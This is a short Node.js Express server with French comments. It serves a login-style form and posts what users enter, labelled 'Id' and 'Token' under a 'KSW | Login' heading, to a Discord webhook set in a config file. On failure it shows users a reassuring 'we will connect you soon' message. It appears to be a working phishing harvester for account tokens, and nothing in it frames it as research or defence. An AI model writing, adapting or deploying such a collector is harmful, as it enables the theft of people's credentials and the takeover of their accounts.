import express from 'express';
import path from 'path';
import fetch from 'node-fetch'; // Utiliser 'node-fetch' si vous êtes en mode ES6
import { fileURLToPath } from 'url';
import { config } from './config.js'; // Importation de la configuration avec l'URL du Webhook

const app = express();
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Middleware pour parser les données du formulaire
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Serve le formulaire HTML à la racine
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Route pour traiter l'envoi du formulaire et envoyer à Discord
app.post('/send-to-discord', (req, res) => {
    const { username, message } = req.body;

    if (!username || !message) {
        return res.status(400).json({ error: 'Nom et message sont requis.' });
    }

    const embed = {
        content: null,
        embeds: [
            {
                title: '<:IconInvite:1303508250473402429>〃KSW | Login',
                description: `**__Id__**: ${username}\n__**Token**__: ${message}`,
                color: 0,
                timestamp: new Date().toISOString(),
            },
        ],
    };

    // Envoi du message à Discord via le webhook
    fetch(config.DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(embed),
    })
        .then((response) => {
            if (!response.ok) {
                return res.status(500).json({ error: 'Nous allons te connecter prochainement' });
            }
        })
});

// Route pour afficher la page de remerciement
app.get('/thanks', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'thanks.html'));
});

// Démarrer le serveur sur le port 3000
app.listen(3000, () => {
    console.log('Server is running on http://localhost:3000');
});
